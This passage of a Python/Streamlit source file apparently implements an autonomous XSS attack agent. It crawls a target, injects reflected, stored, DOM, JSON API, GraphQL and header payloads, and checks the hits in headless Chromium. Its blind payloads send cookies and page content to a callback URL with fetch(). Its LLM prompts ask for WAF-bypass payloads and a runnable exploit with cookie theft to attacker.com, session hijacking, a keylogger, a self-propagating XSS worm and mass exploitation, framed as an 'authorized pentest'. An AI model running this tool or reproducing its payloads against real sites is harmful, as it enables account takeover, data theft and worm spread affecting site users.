                        "context": "Prototype pollution",
                        "body_snippet": resp.text[:300],
                        "browser_confirmed": False,
                        "severity": "MEDIUM-HIGH — prototype pollution probe",
                    })
                    log(f"Prototype pollution probe reflected: {page['url']} {key}",
                        "warn", term_ph, stats_phs)
                    st.session_state.points_found += 1
            except Exception:
                pass
    return hits


def _hunt_json_api(pages: list, term_ph, stats_phs) -> list:
    """Inject XSS payloads into JSON API endpoints."""
    hits = []
    all_endpoints = list({ep for p in pages for ep in p.get("js_endpoints", [])})
    json_headers = dict(REQ_HEADERS)
    json_headers["Content-Type"] = "application/json"
    json_headers["Accept"]       = "application/json"

    xss_payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
    ]
    for ep in all_endpoints[:12]:
        for payload in xss_payloads[:2]:
            try:
                bodies = [
                    json.dumps({"q": payload, "query": payload, "input": payload}),
                    json.dumps({"data": {"value": payload}}),
                    json.dumps([payload]),
                ]
                for body in bodies[:1]:
                    resp = requests.post(ep, data=body, headers=json_headers,
                                         timeout=REQUEST_TIMEOUT)
                    if payload in resp.text:
                        ref = _check_reflection(resp.text, payload)
                        if ref["reflected"] and not ref.get("escaped"):
                            r = {
                                "url": ep, "param": "JSON body",
                                "payload": payload, "method": "post",
                                "status": resp.status_code,
                                "reflected": True, "escaped": False, "partial": False,
                                "context": "JSON API reflection",
                                "body_snippet": ref.get("snippet", resp.text[:200]),
                                "browser_confirmed": False,
                                "severity": "HIGH — JSON API XSS",
                            }
                            hits.append(r)
                            log(f"JSON API XSS reflection: {ep}", "vuln", term_ph, stats_phs)
                            st.session_state.vulns_found += 1
                            break
            except Exception:
                pass
    return hits


def _hunt_dom_xss_playwright(target: str, pages: list,
                              payloads: list, term_ph, stats_phs) -> list:
    """Use Playwright to test DOM XSS via URL fragments and search params."""
    hits = []
    if not PLAYWRIGHT_OK:
        log("Playwright not available — skipping DOM XSS browser hunt", "skip", term_ph, stats_phs)
        return hits

    # Pages with DOM sinks are highest priority
    sink_pages = [p for p in pages if p.get("dom_sinks")]
    if not sink_pages:
        sink_pages = pages[:3]

    dom_payloads = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
    ]

    for page in sink_pages[:5]:
        for payload in dom_payloads:
            encoded = urllib.parse.quote(payload)
            # Test hash injection
            hash_url = page["url"].split("#")[0] + "#" + encoded
            # Test search param injection (common DOM XSS pattern)
            search_url = page["url"] + ("&" if "?" in page["url"] else "?") + "q=" + encoded

            for test_url in [hash_url, search_url]:
                try:
                    with sync_playwright() as pw:
                        browser = pw.chromium.launch(headless=True, args=[
                            "--no-sandbox", "--disable-setuid-sandbox",
                            "--disable-dev-shm-usage", "--disable-gpu",
                            "--disable-web-security",
                        ])
                        ctx  = browser.new_context(ignore_https_errors=True)
                        pg   = ctx.new_page()
                        pg.add_init_script("""
                            window._dom_xss_hit=false;
                            var _oa=window.alert;
                            window.alert=function(m){window._dom_xss_hit=true;
                                window._dom_xss_msg=String(m);try{_oa(m);}catch(e){}};
                        """)
                        fired = {"v": False, "m": ""}

                        def _dlg(d):
                            fired["v"] = True
                            fired["m"] = d.message
                            try: d.dismiss()
                            except Exception: pass

                        pg.on("dialog", _dlg)
                        try:
                            pg.goto(test_url, wait_until="networkidle", timeout=10000)
                        except Exception:
                            try:
                                pg.goto(test_url, wait_until="domcontentloaded", timeout=6000)
                            except Exception:
                                pass
                        pg.wait_for_timeout(2000)

                        confirmed = fired["v"]
                        if not confirmed:
                            try:
                                confirmed = pg.evaluate("window._dom_xss_hit===true")
                            except Exception:
                                pass
                        if confirmed:
                            screenshot = None
                            try: screenshot = pg.screenshot()
                            except Exception: pass
                            msg = fired["m"] or ""
                            try: msg = pg.evaluate("window._dom_xss_msg||''")
                            except Exception: pass
                            hits.append({
                                "url": test_url,
                                "param": "fragment/search (DOM source)",
                                "payload": payload, "method": "get",
                                "status": 200,
                                "reflected": True, "escaped": False, "partial": False,
                                "context": "DOM-based XSS (browser-verified)",
                                "body_snippet": "",
                                "browser_confirmed": True,
                                "dialog_msg": msg,
                                "screenshot": screenshot,
                                "severity": "CRITICAL — DOM XSS confirmed in browser",
                            })
                            st.session_state.vulns_found += 1
                            log(f"🎯 DOM XSS CONFIRMED — {test_url[:80]}"
                                + (f' dialog: "{msg}"' if msg else ""),
                                "vuln", term_ph, stats_phs)
                        browser.close()
                        if confirmed:
                            break  # found it, next page
                except Exception:
                    pass
            else:
                continue
            break  # payload worked, next page
    return hits


def _hunt_header_injection(target: str, term_ph, stats_phs) -> list:
    """Test HTTP header injection."""
    hits = []
    probe = "HEADERINJECT9182"
    for hname, hval in {
        "X-Forwarded-For": probe,
        "X-Real-IP":       probe,
        "Referer":         f"https://evil.com/{probe}",
        "X-Custom-Header": f'<script>alert("{probe}")</script>',
    }.items():
        try:
            h = dict(REQ_HEADERS)
            h[hname] = hval
            resp = requests.get(target, headers=h, timeout=REQUEST_TIMEOUT)
            if probe in resp.text:
                idx = resp.text.find(probe)
                hits.append({
                    "url": target, "param": hname, "payload": hval,
                    "method": "header", "status": resp.status_code,
                    "reflected": True, "escaped": False, "partial": False,
                    "context": f"HTTP header ({hname})",
                    "body_snippet": resp.text[max(0, idx-50): idx+100],
                    "browser_confirmed": False,
                })
                log(f"Header injection — {hname} reflected in response",
                    "vuln", term_ph, stats_phs)
                st.session_state.vulns_found += 1
        except Exception:
            pass
    return hits


# ── Stored XSS Hunting ────────────────────────────────────────────────────────
def _hunt_stored_xss(pages: list, payloads: list, term_ph, stats_phs) -> list:
    """
    Real stored XSS detection:
    1. Identify POST forms (likely storage endpoints)
    2. Submit with a unique marker + XSS payload
    3. Re-crawl ALL pages looking for the marker unescaped
    4. Browser-verify via Playwright on the page where it appeared
    """
    import time as _time
    hits = []
    unique_id = f"xssprobe{int(_time.time())}"
    storage_forms = [
        (page, form)
        for page in pages
        for form in page.get("forms", [])
        if form["method"] == "post"
    ]
    if not storage_forms:
        log("No POST forms found — skipping stored XSS phase", "skip", term_ph, stats_phs)
        return hits

    log(f"Found {len(storage_forms)} POST form(s) — testing stored XSS", "hunt", term_ph, stats_phs)

    for page, form in storage_forms[:8]:
        base_data = {f["name"]: f.get("value", "test") for f in form.get("fields", [])}
        for field in form.get("fields", [])[:4]:
            fname = field["name"]
            for payload in payloads[:6]:
                marker = f"{unique_id}_{fname}"
                data   = dict(base_data)
                data[fname] = marker + payload

                try:
                    # Submit the form
                    resp = requests.post(
                        form["action"], data=data, headers=REQ_HEADERS,
                        timeout=REQUEST_TIMEOUT, allow_redirects=True)
                    log(f"  Stored probe → {form['action']} field={fname} status={resp.status_code}",
                        "hunt", term_ph, stats_phs)
                except Exception:
                    continue

                # Re-crawl all discovered pages looking for the marker
                found_on = []
                for check_page in pages:
                    r2 = safe_req("get", check_page["url"])
                    if r2 and marker in r2.text:
                        ref = _check_reflection(r2.text, payload)
                        if ref["reflected"] and not ref.get("escaped"):
                            found_on.append((check_page["url"], r2.text, ref))
                            break

                if found_on:
                    store_url, store_body, ref = found_on[0]
                    log(f"  🎯 STORED — payload found on {store_url}", "vuln", term_ph, stats_phs)
                    st.session_state.points_found += 1

                    r_hit = {
                        "url": store_url,
                        "inject_url": form["action"],
                        "param": fname,
                        "payload": payload,
                        "method": "stored-post",
                        "status": 200,
                        "reflected": True, "escaped": False, "partial": False,
                        "context": f"STORED XSS — injected via {form['action']} field={fname}",
                        "body_snippet": ref.get("snippet", store_body[:300]),
                        "browser_confirmed": False,
                        "severity": "CRITICAL — stored XSS persists for all visitors",
                    }

                    # Browser-verify
                    if PLAYWRIGHT_OK:
                        log(f"  ↳ Browser-verifying stored XSS on {store_url}...",
                            "warn", term_ph, stats_phs)
                        bv = verify_in_browser(store_url, fname, payload, "get")
                        r_hit["browser_confirmed"] = bv["confirmed"]
                        r_hit["screenshot"]        = bv.get("screenshot")
                        r_hit["dialog_msg"]        = bv.get("dialog_msg")
                        if bv["confirmed"]:
                            st.session_state.vulns_found += 1
                            log(f"  🎯 STORED XSS BROWSER CONFIRMED on {store_url}",
                                "vuln", term_ph, stats_phs)
                        else:
                            st.session_state.vulns_found += 1
                            log(f"  ⚠️ Stored (unescaped) but not confirmed in browser",
                                "warn", term_ph, stats_phs)
                    else:
                        st.session_state.vulns_found += 1

                    hits.append(r_hit)
                    break  # next form field
    return hits


# ── GraphQL hunting ────────────────────────────────────────────────────────────
def _hunt_graphql(target: str, pages: list, term_ph, stats_phs) -> list:
    """Probe GraphQL endpoints, run introspection, inject XSS in string fields."""
    hits = []
    gql_candidates = ["/graphql", "/api/graphql", "/v1/graphql",
                      "/gql", "/query", "/graphiql", "/playground"]
    parsed_target = urllib.parse.urlparse(target)
    base = f"{parsed_target.scheme}://{parsed_target.netloc}"

    # Also check from discovered JS endpoints
    js_eps = [ep for p in pages for ep in p.get("js_endpoints", [])]
    gql_from_js = [ep for ep in js_eps if "graphql" in ep.lower() or "/gql" in ep.lower()]
    endpoints_to_try = list({base + c for c in gql_candidates} | set(gql_from_js))

    headers = dict(REQ_HEADERS)
    headers["Content-Type"] = "application/json"
    headers["Accept"]       = "application/json"

    introspection = json.dumps({"query": "{ __schema { types { name fields { name } } } }"})
    xss_query     = json.dumps({"query": '{ __typename @skip(if: false) }',
                                 "variables": {"x": '<img src=x onerror=alert(1)>'}})

    for ep in endpoints_to_try[:10]:
        try:
            resp = requests.post(ep, data=introspection, headers=headers,
                                 timeout=REQUEST_TIMEOUT)
            if resp.status_code == 200 and "__schema" in resp.text:
                log(f"GraphQL endpoint found: {ep}", "vuln", term_ph, stats_phs)
                # Try XSS in variables
                for xss_pl in ['<img src=x onerror=alert(1)>', '"><script>alert(1)</script>']:
                    xss_payload = json.dumps({
                        "query": 'query($x:String){__typename}',
                        "variables": {"x": xss_pl},
                    })
                    r2 = requests.post(ep, data=xss_payload, headers=headers,
                                       timeout=REQUEST_TIMEOUT)
                    if xss_pl in r2.text:
                        hits.append({
                            "url": ep, "param": "GraphQL variables",
                            "payload": xss_pl, "method": "post",
                            "status": r2.status_code,
                            "reflected": True, "escaped": False, "partial": False,
                            "context": "GraphQL variable reflection",
                            "body_snippet": r2.text[:400],
                            "browser_confirmed": False,
                            "severity": "HIGH — GraphQL XSS in API response",
                        })
                        st.session_state.vulns_found += 1
                        log(f"GraphQL XSS reflection: {ep}", "vuln", term_ph, stats_phs)
                        break
            elif resp.status_code in (200, 400) and "errors" in resp.text.lower():
                log(f"GraphQL-like endpoint (errors in response): {ep}", "warn", term_ph, stats_phs)
        except Exception:
            pass
    return hits


# ── AI: payload generation ─────────────────────────────────────────────────────
def ai_generate_payloads(client, target, user_payload, waf,
                          dom_sinks, template_engine, pages) -> list:
    # Build a detailed context summary for each injection point
    ctx_blocks = []
    for p in pages[:6]:
        blk = f"URL: {p['url']}\n"
        if p.get("params"):
            blk += f"  GET params: {p['params']}\n"
        for fm in p.get("forms", [])[:2]:
            blk += (f"  Form {fm['method'].upper()} → {fm['action']} "
                    f"fields={[x['name'] for x in fm['fields']]}\n")
        if p.get("dom_sinks"):
            blk += f"  DOM sinks:\n" + "\n".join(f"    {s[:80]}" for s in p["dom_sinks"][:3]) + "\n"
        if p.get("inline_js"):
            blk += f"  Inline JS (first 400c):\n{p['inline_js'][:400]}\n"
        # Show HTML around reflection points
        blk += f"  HTML snippet:\n{p['html'][:700]}\n"
        ctx_blocks.append(blk)
    page_ctx = "\n".join(ctx_blocks)

    waf_tactics = {
        "Cloudflare":  "Use unicode \\u003c, \\u003e; HTML entities; SVG vectors; atob(); tag case mix",
        "AWS WAF":     "Use URL double-encoding, null bytes, comment breaks <!-/**/->, backtick template literals",
        "ModSecurity": "Use multiline, \\x encoding, alternate event handlers, data: URIs",
        "Akamai":      "Use unicode code points, attribute order randomization, exotic event handlers",
        "Imperva":     "Use nested tags, CSS expression(), \\v escapes, attribute value splitting",
        "Sucuri":      "Use SVG/MathML, HTML5 semantic tags with event handlers, encoded chars",
        "Wordfence":   "Use template literals, atob() decoding, Function constructor, toString(36)",
    }.get(waf or "", "Use encoding combinations, case mixing, tag splitting, unicode escapes")

    prompt = f"""You are the world's best XSS researcher. Authorized penetration test against {target}.
Study the ACTUAL HTML/JS context below and generate 32 payloads that are EXACTLY adapted to it.

USER'S INTENDED INJECTION: {user_payload}
WAF: {waf or 'none'} — bypass tactics: {waf_tactics}
DOM SINKS PRESENT: {', '.join(dom_sinks[:5]) if dom_sinks else 'none'}
TEMPLATE ENGINE: {template_engine or 'not detected'}

=== PAGE CONTEXT (analyze every character) ===
{page_ctx[:4000]}

Generate payloads covering ALL these angles — be SPECIFIC to the contexts above:

TIER 1 — Exact context hits (most likely to work):
- Adapt user payload EXACTLY to each HTML context found (HTML body / attr / JS / URL)
- Break out of detected attribute quotes (look at which quote char is used in HTML above)
- Escape detected JS string delimiters if input reflects inside a script block

TIER 2 — HTML5 & exotic handlers:
- <details open ontoggle=...>, <svg onload=...>, <body onpageshow=...>
- <iframe srcdoc="...">, <object data="javascript:...">, <embed src="...">
- <math><mtext></mtext><mglyph><image xlink:href="javascript:alert(1)">

TIER 3 — Parser mutation (mXSS) — these bypass sanitizers:
- Nesting <table><td>, <select><option>, <textarea> to break parser context
- <!--<img src="--><img src=x onerror=alert(1)>
- <noscript><p title="</noscript><img src=x onerror=alert(1)>
- <listing>...</listing> context break

TIER 4 — WAF bypass (must pass {waf or 'none'} specifically):
- Entity encoding: &#x3C;script&#x3E;
- Unicode: \u003cscript\u003e
- atob() decoding: eval(atob('BASE64'))
- String.fromCharCode: String.fromCharCode(97,108,101,114,116,40,49,41)
- No-paren: onerror=alert`1`, throw onerror=alert,1
- Tag splitting: <sc\x00ript>, <scr\nipt>

TIER 5 — Second-order & chaining:
- Prototype pollution: ?__proto__[innerHTML]=<img onerror=alert(1) src=1>
- JSONP: alert(document.cookie)//
- CSS injection: </style><script>alert(1)</script>
- javascript: URI for href/src/action

TIER 6 — Stored XSS optimized (survive server-side processing):
- Null byte bypass: %00<script>alert(1)</script>
- Double encoding: %253Cscript%253E
- Unicode normalization: ＜script＞ (fullwidth chars)

Output ONLY a raw JSON array of 32 strings. Zero markdown, zero explanation."""

    try:
        resp = client.chat.completions.create(
            model=MODEL_FAST,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=2000,
            temperature=0.8,
        )
        text = resp.choices[0].message.content.strip()
        text = re.sub(r"```[a-z]*\n?|```", "", text).strip()
        m = re.search(r"\[.*\]", text, re.DOTALL)
        if m:
            parsed = json.loads(m.group())
            if isinstance(parsed, list) and len(parsed) >= 5:
                return [str(p) for p in parsed]
    except Exception:
        pass
    return BASE_PAYLOADS


# ── AI: exploit generation ─────────────────────────────────────────────────────
def ai_write_exploit(client, findings: list, target: str, blind_url: str) -> str:
    if not findings:
        return ""
    confirmed = [f for f in findings if f.get("browser_confirmed")]
    best = confirmed[0] if confirmed else findings[0]
    all_vulns_summary = json.dumps([{
        "url": f["url"], "param": f["param"], "payload": f["payload"],
        "context": f.get("context",""), "method": f["method"],
        "confirmed": f.get("browser_confirmed", False),
    } for f in findings[:8]], indent=2)

    prompt = f"""Write a COMPLETE, RUNNABLE Python exploit script for this authorized pentest.

Target: {target}
All vulnerabilities found:
{all_vulns_summary}

Best confirmed finding:
  URL: {best['url']}
  Param: {best['param']}
  Method: {best['method'].upper()}
  Context: {best.get('context','HTML body')}
  Working payload: {best['payload']}
  Browser confirmed: {best.get('browser_confirmed', False)}
  Snippet: {best.get('body_snippet','')[:400]}
{"Blind callback: " + blind_url if blind_url else ""}

Write a COMPLETE Python script that:

1. MODULE: Verify — HTTP GET/POST, check payload reflects unescaped, print PASS/FAIL
2. MODULE: Cookie Theft — inject fetch("attacker.com?c="+document.cookie) payload, show HTTP server to receive
3. MODULE: Session Hijack — steal cookie, use it to make authenticated requests as victim
4. MODULE: Keylogger — inject payload that sends keystrokes to attacker server
5. MODULE: Stored XSS persistence — if stored vuln exists, inject a script that also re-injects itself (worm)
6. MODULE: Admin escalation — if any admin panel detected, try stored XSS there for max impact
7. MODULE: Payload generator — auto-generate 10 WAF bypass variants of the working payload
8. MODULE: Mass exploitation — iterate through discovered pages and inject in all vulnerable params

Use: requests, argparse, http.server, base64, threading
Include: argparse CLI so each module can be run independently (--verify, --steal-cookies, etc.)
Comments explain exactly what each section does and why.
Make it realistic — real pentesters would use this script.

Output ONLY raw Python code. No markdown fences."""

    try:
        resp = client.chat.completions.create(
            model=MODEL_FAST,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=2500, temperature=0.05,
        )
        return re.sub(r"```python\n?|```", "",
                      resp.choices[0].message.content.strip()).strip()
    except Exception as e:
        return f"# Error generating exploit: {e}"


# ── AI: security report ────────────────────────────────────────────────────────
def ai_full_report(client, findings, pages, target, dom_sinks,
                   waf, header_issues, template_engine,
                   postmessage_handlers, advanced_hits) -> str:
    surface = {
        "pages": len(pages),
        "forms": sum(len(p["forms"]) for p in pages),
        "url_params": sum(len(p["params"]) for p in pages),
        "dom_sinks": len(dom_sinks),
        "waf": waf or "none",
        "template_engine": template_engine or "none",
        "header_issues": header_issues,
        "postmessage_handlers_no_origin": sum(
            1 for p in pages for h in p.get("postmessage_handlers", [])
            if h.get("no_origin_check")),
        "jsonp_endpoints": [ep for p in pages for ep in p.get("jsonp_endpoints", [])],
        "redirect_params": [p for pg in pages for p in pg.get("redirect_params", [])],
        "js_endpoints": list({ep for p in pages for ep in p.get("js_endpoints", [])})[:12],
        "urls": [p["url"] for p in pages[:12]],
    }

    all_findings = findings + advanced_hits
    if all_findings:
        fsum = json.dumps([{
            "url": f["url"], "param": f["param"], "payload": f["payload"],
            "method": f["method"], "context": f.get("context", ""),
            "browser_confirmed": f.get("browser_confirmed", False),
            "severity": f.get("severity", "HIGH"),
            "snippet": f.get("body_snippet", "")[:250],
        } for f in all_findings[:10]], indent=2)
        prompt = f"""Senior penetration tester. Write a comprehensive security report for an authorized engagement.

Target: {target}
All confirmed findings ({len(all_findings)} total):
{fsum}

Attack surface:
{json.dumps(surface, indent=2)}

DOM sinks:
{chr(10).join(dom_sinks[:12])}

Write these sections precisely:

## Executive Summary
Risk rating (Critical/High/Medium). Business impact for a non-technical audience.

## Confirmed Vulnerabilities
For each finding:
- Type + CVSS 3.1 score + vector string
- Exact URL, parameter, method, context
- Working payload
- Concrete real-world attack scenario (what attacker does)
- curl PoC command

## Zero-Day Attack Surface
Based on DOM sinks, postMessage handlers, JSONP, redirect params, and prototype pollution found.
Identify specific code patterns that likely have exploitable zero-days. For each:
- Exact location and pattern
- Attack vector
- Specific payload to try
- Why this is a zero-day candidate

## Attack Chains
How these vulnerabilities chain:
- XSS → session hijack → account takeover
- XSS → CSRF → privilege escalation  
- Open redirect → phishing → credential harvest
- Prototype pollution → property injection → XSS

## CSP & Defense Analysis
What protections exist, what bypasses are possible.

## Remediation (priority-ordered with code fixes)

## Next Steps — Specific Commands
curl/Python commands to copy-paste for deeper exploitation."""
    else:
        prompt = f"""Senior penetration tester. No direct reflections confirmed. Write a deep zero-day hunting guide.

Target: {target}
Attack surface: {json.dumps(surface, indent=2)}
DOM sinks: {chr(10).join(dom_sinks[:12])}
WAF: {waf or 'none'}
Template engine: {template_engine or 'unknown'}

Write:

## Attack Surface Assessment
What was found, risk rating per component.

## Why Testing Missed (Root Cause)
SPA? Auth required? WAF? Stored XSS? JSON-only API?

## DOM XSS Zero-Day Hunt
For each sink: exact source, payload, and manual test steps.

## postMessage Exploitation Plan
If handlers found without origin checks.

## JSONP & Cache Poisoning Attack Plan
Specific endpoints and payloads.

## Prototype Pollution → XSS Chain
Specific vectors for this target.

## Blind XSS Attack Plan
Which forms/endpoints, exact payloads with webhook.

## Manual Commands (copy-paste ready)"""

    try:
        resp = client.chat.completions.create(
            model=MODEL_FAST,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=MAX_TOKENS, temperature=0.2,
        )
        return resp.choices[0].message.content
    except Exception as e:
        return f"Error: {e}"


# ── Agent orchestrator ─────────────────────────────────────────────────────────
def run_agent(target, user_payload, max_depth, blind_url, term_ph, stats_phs):
    client = get_client()
    L = lambda msg, kind="info": log(msg, kind, term_ph, stats_phs)

    L(f"Target  : {target}")
    L(f"Payload : {user_payload}")
    L(f"Depth   : {max_depth}")
    if blind_url:
        L(f"Blind   : {blind_url}", "blind")
    L("━" * 50)

    # Phase 1 — Crawl
    L("PHASE 1 — CRAWL & RECON", "info")
    pages = crawl(target, max_depth, term_ph, stats_phs)
    L(f"Crawl done — {len(pages)} pages | "
      f"{sum(len(p['forms']) for p in pages)} forms | "
      f"{sum(len(p['params']) for p in pages)} URL params | "
      f"{len({ep for p in pages for ep in p.get('js_endpoints',[])})} JS endpoints", "ok")

    all_sinks = list(dict.fromkeys(
        s for p in pages for s in p.get("dom_sinks", [])
    ))[:25]
    st.session_state.dom_sinks = all_sinks
    if all_sinks:
        L(f"DOM sinks: {len(all_sinks)} found", "dom")
        for s in all_sinks[:5]:
            L(f"  {s[:110]}", "dom")

    # PostMessage handlers
    pm_handlers = [h for p in pages for h in p.get("postmessage_handlers", [])]
    unsafe_pm   = [h for h in pm_handlers if h.get("no_origin_check")]
    if unsafe_pm:
        L(f"⚠️  {len(unsafe_pm)} postMessage handlers WITHOUT origin check!", "warn")
        for h in unsafe_pm[:2]:
            L(f"  {h['snippet'][:100]}", "warn")

    # JSONP
    all_jsonp = [ep for p in pages for ep in p.get("jsonp_endpoints", [])]
    if all_jsonp:
        L(f"JSONP endpoints: {len(all_jsonp)}", "warn")
        for ep in all_jsonp[:3]:
            L(f"  {ep}", "cmd")

    resp0 = safe_req("get", target)
    waf   = detect_waf(resp0)
    st.session_state.waf_detected = waf
    L(f"WAF: {waf or 'none detected'}", "warn" if waf else "ok")

    header_issues = []
    if pages:
        header_issues = _analyze_headers(pages[0]["headers"])
        for issue in header_issues:
            L(issue, "warn")

    eng, ssti_payloads = _detect_template_engine(pages)
    if eng:
        L(f"Template engine: {eng} — SSTI payloads queued", "warn")

    # Phase 2 — AI Payloads
    L("━" * 50)
    L("PHASE 2 — AI PAYLOAD GENERATION", "ai")
    payloads = ai_generate_payloads(
        client, target, user_payload, waf, all_sinks, eng, pages)
    payloads += ssti_payloads[:5]

    if blind_url:
        blind_payloads = [
            f'<img src=x onerror=fetch("{blind_url}?c="+document.cookie)>',
            f'"><img src=x onerror=fetch("{blind_url}?c="+document.cookie)>',
            f"'><script>fetch('{blind_url}?d='+btoa(document.cookie))</script>",
            f'<svg onload=fetch("{blind_url}?dom="+btoa(document.body.innerHTML.slice(0,500)))>',
        ]
        payloads = blind_payloads + payloads

    seen = set()
    payloads = [p for p in payloads if not (p in seen or seen.add(p))]

    L(f"Generated {len(payloads)} context-aware payloads", "ai")
    for i, pl in enumerate(payloads[:6], 1):
        L(f"  [{i}] {pl[:100]}", "cmd")

    # Phase 3 — Reflected XSS Testing
    L("━" * 50)
    L("PHASE 3 — REFLECTED XSS TESTING", "info")
    all_findings = []
    for page in pages:
        hits = test_page(page, payloads, term_ph, stats_phs)
        all_findings.extend(hits)
    confirmed_3 = [f for f in all_findings if f.get("browser_confirmed")]
    L(f"Tested {st.session_state.points_found} injection pts | "
      f"{len(confirmed_3)} browser-confirmed | {len(all_findings)-len(confirmed_3)} reflected-only", "ok")

    # Phase 3.5 — Stored XSS Hunting
    L("━" * 50)
    L("PHASE 3.5 — STORED XSS HUNTING", "hunt")
    L("  Injecting markers into POST forms and re-crawling for persistence...", "hunt")
    stored_hits = _hunt_stored_xss(pages, payloads, term_ph, stats_phs)
    if stored_hits:
        L(f"  {len(stored_hits)} stored XSS candidate(s) found!", "vuln")
    else:
        L("  No stored XSS found via POST forms", "info")
    all_findings += stored_hits

    # Phase 4 — Advanced Zero-Day Hunting
    L("━" * 50)
    L("PHASE 4 — ADVANCED ZERO-DAY HUNTING", "hunt")

    advanced_hits = []

    L("  › Cache poisoning (unkeyed headers)...", "hunt")
    advanced_hits += _hunt_cache_poisoning(target, term_ph, stats_phs)

    L("  › Open redirect → javascript: URL...", "hunt")
    advanced_hits += _hunt_open_redirect(pages, term_ph, stats_phs)

    L("  › JSONP callback injection...", "hunt")
    advanced_hits += _hunt_jsonp(pages, term_ph, stats_phs)

    L("  › Prototype pollution...", "hunt")
    advanced_hits += _hunt_prototype_pollution(target, pages, term_ph, stats_phs)

    L("  › JSON API body injection...", "hunt")
    advanced_hits += _hunt_json_api(pages, term_ph, stats_phs)

    L("  › HTTP header injection...", "hunt")
    advanced_hits += _hunt_header_injection(target, term_ph, stats_phs)

    L("  › GraphQL introspection + injection...", "hunt")
    advanced_hits += _hunt_graphql(target, pages, term_ph, stats_phs)

    L("  › DOM XSS via Playwright (hash/search sources)...", "hunt")
    advanced_hits += _hunt_dom_xss_playwright(target, pages, payloads, term_ph, stats_phs)

    if advanced_hits:
        L(f"Advanced hunt: {len(advanced_hits)} additional finding(s)", "ok")
    else:
        L("Advanced hunt: no additional attack vectors confirmed", "info")

    all_findings += advanced_hits
    st.session_state.findings = all_findings

    total_confirmed = len([f for f in all_findings if f.get("browser_confirmed")])
    L(f"Total: {len(all_findings)} findings | {total_confirmed} browser-confirmed", "ok")

    # Phase 5 — Exploit Script Generation
    if all_findings:
        L("━" * 50)
        L("PHASE 5 — WRITING CUSTOM EXPLOIT SCRIPTS", "ai")
        exploit = ai_write_exploit(client, all_findings, target, blind_url)
        st.session_state.exploit_code = exploit
        L("Standalone Python exploit script generated (see Exploit Code tab)", "ok")

    # Phase 6 — Report
    L("━" * 50)
    L("PHASE 6 — AI SECURITY REPORT", "ai")
    report = ai_full_report(
        client, all_findings, pages, target, all_sinks,
        waf, header_issues, eng, pm_handlers, advanced_hits)
    st.session_state.report = report
    L("Report complete", "ok")
    L("━" * 22 + " DONE " + "━" * 22, "ok")
    st.session_state.done    = True
    st.session_state.running = False


# ═══════════════════════════════════ UI ═══════════════════════════════════════
st.markdown("""
<style>
/* minimal global overrides */
[data-testid="stAppViewContainer"] { background: #0f111a; }
[data-testid="stHeader"] { background: #0f111a; }
</style>
""", unsafe_allow_html=True)

st.title("🕷️ XSS Autonomous Agent")
st.caption("Authorized use only — only test systems you own or have explicit written permission to test.")

# Mission config
with st.container(border=True):
    st.subheader("🎯 Mission")
    c1, c2 = st.columns([3, 1])
    with c1:
        target_input = st.text_input("Target URL",
                                      value=st.session_state._last_target,
                                      placeholder="https://your-test-site.com")
    with c2:
        depth_input = st.slider("Crawl depth", 1, 5,
                                 int(st.session_state._last_depth))

    payload_input = st.text_area(
        "What to inject",
        value=st.session_state._last_payload,
        placeholder='<script>alert("owned")</script>  or  '
                    '<img src=x onerror=fetch("https://myserver/?c="+document.cookie)>',
        height=68,
    )
    blind_input = st.text_input(
        "Blind XSS callback URL (optional)",
        value=st.session_state._last_blind_url,
        placeholder="https://your-webhook.site/callback",
        help="Payloads will exfiltrate cookies/DOM to this URL",
    )
    ca, cb = st.columns([2, 1])
    with ca:
        start_btn = st.button("🚀 Launch Agent", type="primary",
                               use_container_width=True,
                               disabled=st.session_state.running)
    with cb:
        if st.button("🗑️ Reset", use_container_width=True):
            for k, v in defaults.items():
                st.session_state[k] = v
            st.rerun()

# Stats
sc   = st.columns(5)
s_phs = tuple(col.empty() for col in sc)
_render_stats(*s_phs)

# Terminal — uses components.html so JS actually runs
term_ph = st.empty()
_draw_terminal(term_ph)

# Results tabs
tab1, tab2, tab3, tab4 = st.tabs([
    "📊 Findings & Report", "💻 Exploit Code",
    "🔬 DOM Sinks", "🖥️ Manual Terminal"
])

with tab1:
    if st.session_state.findings:
        confirmed = [f for f in st.session_state.findings if f.get("browser_confirmed")]
        reflected = [f for f in st.session_state.findings if not f.get("browser_confirmed")]
        if confirmed:
            st.error(f"🎯 {len(confirmed)} BROWSER-CONFIRMED execution(s) — zero false positives")
        if reflected:
            st.warning(f"⚠️ {len(reflected)} reflected (unescaped) — not browser-verified yet")

        for i, f in enumerate(st.session_state.findings, 1):
            ok    = f.get("browser_confirmed", False)
            badge = "🎯 EXECUTED" if ok else "⚠️ REFLECTED"
            label = f"#{i} {badge} [{f.get('context','?')}] {f['url']} — {f['param']}"
            with st.expander(label, expanded=(i == 1)):
                if ok:
                    st.success("✅ JavaScript executed in real Chromium"
                               + (f' — dialog: `{f["dialog_msg"]}`'
                                  if f.get("dialog_msg") else ""))
                else:
                    st.warning("Reflected unescaped in HTTP response — not confirmed in browser")
                if f.get("severity"):
                    st.info(f["severity"])
                st.code(f["payload"], language="html")
                c1, c2 = st.columns(2)
                with c1:
                    st.markdown(f"**URL:** `{f['url']}`  \n"
                                f"**Param:** `{f['param']}`  \n"
                                f"**Method:** `{f['method'].upper()}`")
                with c2:
                    st.markdown(f"**Context:** `{f.get('context','?')}`  \n"
                                f"**HTTP:** `{f.get('status','?')}`  \n"
                                f"**Partial:** `{f.get('partial', False)}`")
                if f.get("body_snippet"):
                    st.code(f["body_snippet"], language="html")
                if f.get("screenshot"):
                    st.subheader("📸 Proof Screenshot")
                    st.image(f["screenshot"],
                             caption="Headless Chromium at moment of injection",
                             use_container_width=True)

    if st.session_state.get("report"):
        st.divider()
        st.subheader("📝 AI Security Report")
        st.markdown(st.session_state.report)

    if not st.session_state.done and not st.session_state.running:
        st.info("Launch the agent to see findings.")

with tab2:
    if st.session_state.exploit_code:
        st.subheader("🔧 AI-Generated Exploit")
        st.code(st.session_state.exploit_code, language="python")
        st.download_button("⬇️ exploit.py", st.session_state.exploit_code,
                           file_name="exploit.py", mime="text/plain")
    else:
        st.info("Exploit script appears after a browser-confirmed vulnerability.")

with tab3:
    if st.session_state.dom_sinks:
